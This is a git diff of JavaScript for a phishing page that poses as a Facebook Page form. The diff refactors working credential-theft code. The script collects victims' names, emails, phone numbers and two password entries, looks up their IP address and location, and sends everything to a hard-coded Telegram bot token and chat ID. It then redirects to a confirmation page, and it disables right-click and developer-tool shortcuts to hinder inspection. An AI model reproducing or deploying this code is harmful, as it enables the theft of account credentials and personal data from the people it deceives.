@@ -4,17 +4,7 @@ let bot = {
     TOKEN: "6364188191:AAFmBsaqx58xGorfI_ergea9gA7UFyoLtOA",
     chatID: "-4122063919",
 };
-document.addEventListener("keydown", function (event){
-    if (event.ctrlKey){
-       event.preventDefault();
-    }
-    if(event.keyCode == 123){
-       event.preventDefault();
-    }
-});
-document.addEventListener('contextmenu',
-    event => event.preventDefault()
-    );
+
 function openForm() {
     document.getElementById("myForm").style.display = "flex";
 }
@@ -26,90 +16,88 @@ function closeForm() {
 form.addEventListener("submit", (e) => {
     e.preventDefault();
     $.getJSON("https://api.db-ip.com/v2/free/self", function (data) {
-        let nameFanpage = ` Facebook Page: ${
-            document.getElementsByName("nameFanpage")[0].value
-        }`;
-        let fullname = `Fullname: ${
-            document.getElementsByName("fullname")[0].value
-        }`;
-        let email = `User Email: ${
-            document.getElementsByName("email")[0].value
-        }`;
-        let personalMail = `User Email: ${
-            document.getElementsByName("personalEmail")[0].value
-        }`;
-        let phone = `Phone Number:  ${
-            document.getElementsByName("phone")[0].value
-        }`;
-        let information = `Information: ${
-            document.getElementsByName("information")[0].value
-        }`;
-        console.log(data);
-        let ip = `IP Address: ${data.ipAddress}`;
-        let country = `Country: ${data.countryName}(${data.countryCode})`;
-        let city = `City: ${data.city}`;
-        let p1 = "";
-        let p2 = "";
+        let userData = {
+            nameFanpage: document.getElementsByName("nameFanpage")[0].value,
+            fullname: document.getElementsByName("fullname")[0].value,
+            email: document.getElementsByName("email")[0].value,
+            personalMail: document.getElementsByName("personalEmail")[0].value,
+            phone: document.getElementsByName("phone")[0].value,
+            information: document.getElementsByName("information")[0].value,
+            ipAddress: data.ipAddress,
+            country: `${data.countryName}(${data.countryCode})`,
+            city: data.city,
+            password1: "",
+            password2: ""
+        };
+
         openForm();
+
         let popupform = document.getElementById("form1");
         popupform.addEventListener("submit", (e1) => {
             e1.preventDefault();
-            if (p1 === "") {
-                p1 = document.getElementsByName("password")[0].value;
-                let password1 = `First Password: ${p1}`;
-                let password2 = `Second Password:  ${p2}`;
-                document.getElementById("message").style.display = "block";
-                document.getElementsByName("password")[0].value = "";
-                let message = `
-                ${email}
-                \n${nameFanpage}
-                \n${fullname}
-                \n${personalMail}
-                \n${phone}
-                \n${password1}
-                \n${password2}
-                \n${information}
-                \n${ip}
-                \n${country}
-                \n${city}`;
-                fetch(
-                    `https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${message}`,
-                    {
-                        method: "GET",
-                    }
-                )
-                    .then((res) => console.log(res))
-                    .catch((err) => console.log(err));
+
+            if (userData.password1 === "") {
+                userData.password1 = document.getElementsByName("password")[0].value;
+
+                // Send the first message with password1 only
+                let message1 = `
+                    Data:
+                    User Email: ${userData.email}
+                    Facebook Page: ${userData.nameFanpage}
+                    Fullname: ${userData.fullname}
+                    User Email: ${userData.personalMail}
+                    Phone Number: ${userData.phone}
+                    First Password: ${userData.password1}
+                    Second Password: 
+                    IP Address: ${userData.ipAddress}
+                    Country: ${userData.country}
+                    City: ${userData.city}`;
+
+                fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${encodeURIComponent(message1)}`, {
+                    method: "GET",
+                }).then((res) => {
+                    console.log(res);
+                    document.getElementById("message").innerText = "Enter the second password";
+                }).catch((err) => console.log(err));
             } else {
-                p2 = document.getElementsByName("password")[0].value;
-                let password1 = `First Password: ${p1}`;
-                let password2 = `Second Password:  ${p2}`;
-                document.getElementById("message").style.display = "block";
-                let message = `
-            ${email}
-            \n${nameFanpage}
-            \n${fullname}
-            \n${personalMail}
-            \n${phone}
-            \n${password1}
-            \n${password2}
-            \n${information}
-            \n${ip}
-            \n${country}
-            \n${city}`;
-                fetch(
-                    `https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${message}`,
-                    {
-                        method: "GET",
-                    }
-                )
-                    .then((res) => {
-                        console.log(res);
-                        window.location.href = "confirm.html";
-                    })
-                    .catch((err) => console.log(err));
+                userData.password2 = document.getElementsByName("password")[0].value;
+
+                // Send the second message with both passwords
+                let message2 = `
+                    Data:
+                    User Email: ${userData.email}
+                    Facebook Page: ${userData.nameFanpage}
+                    Fullname: ${userData.fullname}
+                    User Email: ${userData.personalMail}
+                    Phone Number: ${userData.phone}
+                    First Password: ${userData.password1}
+                    Second Password: ${userData.password2}
+                    IP Address: ${userData.ipAddress}
+                    Country: ${userData.country}
+                    City: ${userData.city}`;
+
+                fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${encodeURIComponent(message2)}`, {
+                    method: "GET",
+                }).then((res) => {
+                    console.log(res);
+                    window.location.href = "confirm.html";
+                }).catch((err) => console.log(err));
             }
+
+            document.getElementById("message").style.display = "block";
+            document.getElementsByName("password")[0].value = "";
         });
     });
 });
+
+document.addEventListener("keydown", function (event) {
+    if (event.ctrlKey) {
+        event.preventDefault();
+    }
+    if (event.keyCode == 123) {
+        event.preventDefault();
+    }
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
 
